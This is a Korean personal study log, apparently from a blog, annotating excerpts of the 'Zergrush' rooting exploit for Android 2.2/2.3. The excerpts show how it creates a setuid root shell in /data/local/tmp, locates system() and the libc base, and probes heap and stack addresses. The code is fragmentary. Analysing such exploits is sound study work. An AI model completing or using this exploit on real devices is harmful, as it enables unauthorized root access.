...
github에서 android rooting이라고 검색해서 간단히 만들어져 있는 저그러시 공격 코드를 입수했다.
오늘부로 2차 연구가 시작 된다.
작업이 미뤄지지 않도록 토다에 대한 생각을 잠시 접어둔다.
토다 에리카를 사랑하기 때문에 나는 연구원으로 기다렸고, 이에 해커로 돌변해서 무자비한 해커의
시험 무대에 저그 러시를 올려 놓는다는 생각으로 연구에 임하고 있다.
토다 사랑해!

2020년 8월 18일: 메인 함수(엔트리 포인트)를 분석해 보았다.
약간은 이해가 되지만, 코드들이 네이티브해서 분석이 난해하고 알아보기 힘들다.
천천히 시간을 두고 섭렵해 나가야 겠다.
...
// /data 디렉토리를 리마운트하고, /data/local/tmp/sh를 루트 소유자의 4711 퍼미션으로 설정, ro.kernel.qemu = 1로
// 설정해서 루트쉘 바이너리 만듬.
static void do_root()
{
	remount_data("/data");
...
int main(int argc, char **argv, char **env)
{
	...
	// euid, uid가 0이거나, boomsh가 실행된 경우 do_root() 함수 호출.
	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
		do_root();
	
	// Android 2.2, 2.3 exploit임.

	// /proc/self/exe(해당 공격 코드 바이너리)를 bsh(boomsh로 복사), /system/bin/sh를
	// /data/local/tmp/sh로 복사.
	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	// bsh를 711 퍼미션으로 실행 권한 줌.
	chmod(bsh, 0711);
	...
	// ro.build.version.release 속성을 읽음. (비전 릴리즈).
	__system_property_get("ro.build.version.release", version_release);

	// 2.2의 경우, heap_offset = 0x108, 2.3의 경우 진저브레드로 heap_offset=0x118임.
	...
	// heap_addr은 0xffffff임.
	heap_addr = 0xffffff;

	// ro.build.fingerprint를 삼성 제품읹 검사.
	...
	// find_symbol() 함수로 system 함수 주소를 얻음.
	system_ptr = (uint32_t) find_symbol("system");
	libc_base = system_ptr & 0xfff00000; // libc 베이스 주소 얻음.

	// system_ptr 변수의 주소를 점검.
	...
	// heap_oracle(), find_stack_addr로 stack_addr이 0x41414141이 아닐때까지 시도하고 나감.
	...
	// stack_addr 이 0x41414141이거나 !jumpsz이면 공격 코드 종료. 	
	if (stack_addr == 0x41414141 || !jumpsz) {
